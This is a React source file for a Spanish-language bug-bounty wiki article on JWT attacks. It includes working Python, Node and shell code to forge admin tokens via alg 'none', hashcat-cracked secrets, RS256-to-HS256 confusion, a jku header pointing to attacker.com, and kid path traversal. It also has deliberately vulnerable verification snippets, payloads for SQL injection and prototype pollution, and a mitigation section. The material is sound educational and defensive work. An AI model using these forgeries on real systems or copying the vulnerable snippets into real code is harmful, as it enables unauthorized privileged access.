/**
 * JWT VULNERABILITIES
 * Explotar JSON Web Tokens mal implementados
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Key, Lock, Shield, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function JWTVulnerabilitiesContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="JWT - El Token Más Usado (y Abusado)">
        <Paragraph>
          <Strong>JSON Web Tokens (JWT)</Strong> son el estándar de facto para autenticación en APIs modernas. 
          Un JWT típico tiene 3 partes: <InlineCode>header.payload.signature</InlineCode>. 
          Las vulnerabilidades surgen cuando los desarrolladores confían en el contenido sin validar la firma.
        </Paragraph>

        <AlertDanger title="Vulnerabilidades Comunes">
          <ul className="mt-2 space-y-1">
            <ListItem>🔓 Algorithm confusion (alg: none)</ListItem>
            <ListItem>🔑 Weak secret keys (fuerza bruta)</ListItem>
            <ListItem>🎭 Key confusion (RS256 → HS256)</ListItem>
            <ListItem>📝 JWT claims manipulation</ListItem>
            <ListItem>⏰ Falta de validación de exp/iat</ListItem>
            <ListItem>🔐 JWK injection</ListItem>
          </ul>
        </AlertDanger>

        <HighlightBox color="blue">
          <Strong>Estructura JWT:</Strong>
          <CodeBlock
            language="text"
            code={`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywiYWRtaW4iOmZhbHNlfQ.signature
  ↑ Header (Base64)            ↑ Payload (Base64)      ↑ Signature

Decoded Header:  {"alg":"HS256","typ":"JWT"}
Decoded Payload: {"userId":123,"admin":false}`}
          />
        </HighlightBox>
      </Section>

      <Section id="alg-none" title="1. Algorithm None Attack">
        <Paragraph>
          La vulnerabilidad más famosa: cambiar el algoritmo a <InlineCode>"none"</InlineCode> 
          y eliminar la firma.
        </Paragraph>

        <Subsection title="Código Vulnerable">
          <CodeBlock
            language="javascript"
            title="Node.js - Verificación insegura"
            code={`const jwt = require('jsonwebtoken');

app.post('/api/admin', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  // ❌ VULNERABLE - verify() sin opciones estrictas
  const decoded = jwt.verify(token, SECRET_KEY);
  
  if (decoded.admin === true) {
    res.json({ message: 'Welcome admin!', data: secretData });
  }
});`}
          />
        </Subsection>

        <Subsection title="Exploit - Cambiar alg a 'none'">
          <CodeBlock
            language="python"
            title="Python - Generar JWT sin firma"
            code={`import base64
import json

# Crear header con alg=none
header = {
    "alg": "none",
    "typ": "JWT"
}

# Crear payload con admin=true
payload = {
    "userId": 123,
    "admin": True,  # ← Escalación de privilegios
    "exp": 9999999999
}

# Codificar en Base64
header_b64 = base64.urlsafe_b64encode(
    json.dumps(header).encode()
).decode().rstrip('=')

payload_b64 = base64.urlsafe_b64encode(
    json.dumps(payload).encode()
).decode().rstrip('=')

# JWT sin firma (termina en .)
fake_token = f"{header_b64}.{payload_b64}."

print(fake_token)
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEyMywiYWRtaW4iOnRydWV9.`}
          />

          <TerminalOutput title="Usar token falso">
            {`curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEyMywiYWRtaW4iOnRydWV9." \\
  https://target.com/api/admin

Response:
{
  "message": "Welcome admin!",
  "data": { ... }  ← ¡Acceso admin sin contraseña!
}`}
          </TerminalOutput>
        </Subsection>
      </Section>

      <Section id="weak-secret" title="2. Weak Secret Key (Brute Force)">
        <Paragraph>
          Muchas apps usan secretos débiles como <InlineCode>"secret"</InlineCode>, 
          <InlineCode>"password123"</InlineCode>, o el nombre de la empresa.
        </Paragraph>

        <CodeBlock
          language="bash"
          title="Hashcat - Crackear firma JWT"
          code={`# Instalar hashcat
sudo apt install hashcat

# Guardar JWT en archivo
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyM30.YjE2ZTk4ODY..." > jwt.txt

# Crackear con wordlist
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Si encuentra el secreto:
# Hashcat status: Cracked
# Secret: password123`}
        />

        <Subsection title="Generar JWT con Secret Crackeado">
          <CodeBlock
            language="javascript"
            title="Node.js - Firmar JWT con secret robado"
            code={`const jwt = require('jsonwebtoken');

// Secret descubierto con hashcat
const CRACKED_SECRET = 'password123';

// Crear token con privilegios admin
const maliciousToken = jwt.sign(
  {
    userId: 999,
    username: 'hacker',
    admin: true,
    role: 'superadmin'
  },
  CRACKED_SECRET,
  {
    algorithm: 'HS256'
  }
);

console.log(maliciousToken);`}
          />
        </Subsection>

        <AlertTip title="jwt_tool">
          Usa <Strong>jwt_tool</Strong> para testing automatizado:
          <CodeBlock
            language="bash"
            code={`git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 jwt_tool.py <JWT>

# Opciones útiles:
# -C -d wordlist.txt  → Brute force
# -X a                → All attacks
# -T                  → Tamper payload`}
          />
        </AlertTip>
      </Section>

      <Section id="key-confusion" title="3. Algorithm Confusion (RS256 → HS256)">
        <Paragraph>
          Aplicaciones que usan <Strong>RS256 (asimétrico)</Strong> pueden ser vulnerables 
          si un atacante cambia el algoritmo a <Strong>HS256 (simétrico)</Strong> y firma 
          con la clave pública como secreto.
        </Paragraph>

        <Subsection title="¿Cómo Funciona?">
          <HighlightBox color="red">
            <Strong>RS256:</Strong> Firma con private key, verifica con public key<br/>
            <Strong>HS256:</Strong> Firma y verifica con el mismo secret key<br/><br/>
            <Strong>Ataque:</Strong> Cambiar alg a HS256 y usar la public key (conocida) como secret
          </HighlightBox>
        </Subsection>

        <Subsection title="Exploit Step-by-Step">
          <CodeBlock
            language="bash"
            title="1. Obtener public key del servidor"
            code={`# Muchas apps exponen la public key en /jwks.json o /.well-known/jwks.json
curl https://target.com/.well-known/jwks.json

# O extraer del JWT si tiene 'kid' header
# O desde certificado SSL`}
          />

          <CodeBlock
            language="python"
            title="2. Generar JWT firmado con public key"
            code={`import jwt

# Public key obtenida del servidor (formato PEM)
public_key = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----
"""

# Crear payload malicioso
payload = {
    "userId": 123,
    "admin": True,
    "role": "superadmin"
}

# ❌ Firmar con HS256 usando la PUBLIC KEY como secret
malicious_token = jwt.encode(
    payload,
    public_key,
    algorithm='HS256'
)

print(malicious_token)`}
          />

          <AlertWarning>
            Si el servidor no valida estrictamente el algoritmo esperado, 
            aceptará el token firmado con HS256.
          </AlertWarning>
        </Subsection>
      </Section>

      <Section id="claims-manipulation" title="4. JWT Claims Manipulation">
        <Subsection title="Modificar Payload sin Romper Firma">
          <Paragraph>
            Algunos claims pueden ser manipulados si la app no los valida correctamente:
          </Paragraph>

          <CodeBlock
            language="json"
            title="Payload original"
            code={`{
  "userId": 123,
  "username": "normal_user",
  "role": "user",
  "exp": 1735689600
}`}
          />

          <CodeBlock
            language="json"
            title="Intentos de manipulación"
            code={`// 1. Cambiar userId (si app no valida contra sesión)
{"userId": 1}  // ← ID del admin

// 2. Eliminar expiración
// Omitir el claim "exp" completamente

// 3. Cambiar a futuro lejano
{"exp": 9999999999}

// 4. Inyectar claims adicionales
{"userId": 123, "admin": true}

// 5. SQL injection en claims
{"username": "admin'--"}

// 6. Prototype pollution (Node.js)
{"__proto__": {"admin": true}}`}
          />
        </Subsection>

        <Subsection title="Exploit Real: exp Claim Bypass">
          <CodeBlock
            language="javascript"
            title="Código vulnerable - No valida exp"
            code={`app.use((req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  try {
    // ❌ VULNERABLE - verify sin validar exp
    const decoded = jwt.verify(token, SECRET, {
      algorithms: ['HS256'],
      ignoreExpiration: true  // ← ¡PELIGRO!
    });
    
    req.user = decoded;
    next();
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
});`}
          />

          <AlertDanger>
            Con <InlineCode>ignoreExpiration: true</InlineCode>, tokens expirados siguen siendo válidos.
          </AlertDanger>
        </Subsection>
      </Section>

      <Section id="jwk-injection" title="5. JWK Injection (jku/kid abuse)">
        <Paragraph>
          JWT puede incluir un header <InlineCode>jku</InlineCode> (JWK Set URL) que apunta 
          a un servidor con las claves públicas. Un atacante puede inyectar su propia URL.
        </Paragraph>

        <CodeBlock
          language="json"
          title="Header malicioso con jku"
          code={`{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/evil_jwks.json"  // ← URL del atacante
}`}
        />

        <CodeBlock
          language="json"
          title="evil_jwks.json en servidor atacante"
          code={`{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "use": "sig",
      "n": "0vx7agoebGcQ...",  // ← Clave pública del atacante
      "e": "AQAB"
    }
  ]
}`}
        />

        <Paragraph>
          Si el servidor vulnerable hace fetch a <InlineCode>jku</InlineCode> sin validar 
          el dominio, descargará la clave pública del atacante y validará la firma correctamente.
        </Paragraph>

        <Subsection title="kid (Key ID) Injection">
          <CodeBlock
            language="json"
            title="Path traversal via kid"
            code={`// Header con kid malicioso
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../dev/null"  // ← Path traversal
}

// Si el servidor hace: readFileSync(kid)
// Leerá /dev/null (vacío) y usará string vacío como secret`}
          />

          <CodeBlock
            language="python"
            title="Generar JWT con kid injection"
            code={`import jwt

payload = {"userId": 123, "admin": True}

# Firmar con string vacío (porque kid apunta a /dev/null)
token = jwt.encode(
    payload,
    "",  # Secret vacío
    algorithm="HS256",
    headers={"kid": "../../../../../../dev/null"}
)

print(token)`}
          />
        </Subsection>
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Configuración Segura de JWT">
          Implementar TODAS estas validaciones.
        </AlertDanger>

        <Subsection title="1. Validación Estricta de Algoritmo">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Forzar algoritmo específico"
            code={`const jwt = require('jsonwebtoken');

// ✅ Lista blanca de algoritmos permitidos
const ALLOWED_ALGORITHMS = ['HS256'];

app.use((req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  try {
    // ✅ SEGURO - Especificar algoritmos permitidos
    const decoded = jwt.verify(token, SECRET_KEY, {
      algorithms: ALLOWED_ALGORITHMS,  // ← Solo HS256
      complete: true  // Retorna header + payload
    });
    
    // ✅ Validar algoritmo en header
    if (!ALLOWED_ALGORITHMS.includes(decoded.header.alg)) {
      throw new Error('Invalid algorithm');
    }
    
    req.user = decoded.payload;
    next();
    
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
});`}
          />
        </Subsection>

        <Subsection title="2. Secret Key Fuerte">
          <CodeBlock
            language="javascript"
            title="✅ Generar secret criptográficamente seguro"
            code={`const crypto = require('crypto');

// ✅ SEGURO - 256 bits de entropía
const SECRET_KEY = crypto.randomBytes(32).toString('hex');

// Guardar en variable de entorno
// .env
JWT_SECRET=a7f8d9e6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8

// Nunca hardcodear en código:
// ❌ const SECRET = 'mysecret';
// ❌ const SECRET = 'MyApp2024';`}
          />
        </Subsection>

        <Subsection title="3. Validar TODOS los Claims Críticos">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Validación exhaustiva"
            code={`const jwt = require('jsonwebtoken');

function validateToken(token) {
  try {
    const decoded = jwt.verify(token, SECRET_KEY, {
      algorithms: ['HS256'],
      
      // ✅ Validar expiración (default: true)
      ignoreExpiration: false,
      
      // ✅ Clock tolerance (5 segundos)
      clockTolerance: 5,
      
      // ✅ Verificar audience
      audience: 'https://myapp.com',
      
      // ✅ Verificar issuer
      issuer: 'https://auth.myapp.com',
      
      // ✅ Max age (30 días)
      maxAge: '30d'
    });
    
    // ✅ Validaciones adicionales
    if (!decoded.userId || typeof decoded.userId !== 'number') {
      throw new Error('Invalid userId claim');
    }
    
    if (decoded.admin && !isValidAdmin(decoded.userId)) {
      throw new Error('Invalid admin claim');
    }
    
    return decoded;
    
  } catch (err) {
    throw new Error(\`Token validation failed: \${err.message}\`);
  }
}`}
          />
        </Subsection>

        <Subsection title="4. Usar RS256 para Producción">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Algoritmo asimétrico"
            code={`const fs = require('fs');
const jwt = require('jsonwebtoken');

// ✅ Generar par de claves RSA
// openssl genrsa -out private.pem 2048
// openssl rsa -in private.pem -pubout -out public.pem

const PRIVATE_KEY = fs.readFileSync('private.pem');
const PUBLIC_KEY = fs.readFileSync('public.pem');

// Generar token (solo en auth server)
function generateToken(userId) {
  return jwt.sign(
    {
      userId,
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + (60 * 60), // 1 hora
    },
    PRIVATE_KEY,
    {
      algorithm: 'RS256',
      issuer: 'auth.myapp.com',
      audience: 'api.myapp.com'
    }
  );
}

// Verificar token (en API servers)
function verifyToken(token) {
  return jwt.verify(token, PUBLIC_KEY, {
    algorithms: ['RS256'],  // ← Solo RS256, rechaza HS256
    issuer: 'auth.myapp.com',
    audience: 'api.myapp.com'
  });
}`}
          />
        </Subsection>

        <Subsection title="5. Blacklist de Tokens (Logout)">
          <CodeBlock
            language="javascript"
            title="✅ Redis blacklist para tokens invalidados"
            code={`const Redis = require('ioredis');
const redis = new Redis();

// Logout: agregar token a blacklist
async function logout(token) {
  const decoded = jwt.decode(token);
  const ttl = decoded.exp - Math.floor(Date.now() / 1000);
  
  // Guardar en Redis con TTL = tiempo restante del token
  await redis.set(
    \`blacklist:\${token}\`,
    '1',
    'EX',
    ttl
  );
}

// Middleware: verificar blacklist
async function checkBlacklist(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  
  const isBlacklisted = await redis.exists(\`blacklist:\${token}\`);
  
  if (isBlacklisted) {
    return res.status(401).json({ error: 'Token has been revoked' });
  }
  
  next();
}`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: OAuth Attacks</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/oauth-attacks`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Explotar flujos OAuth mal implementados</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
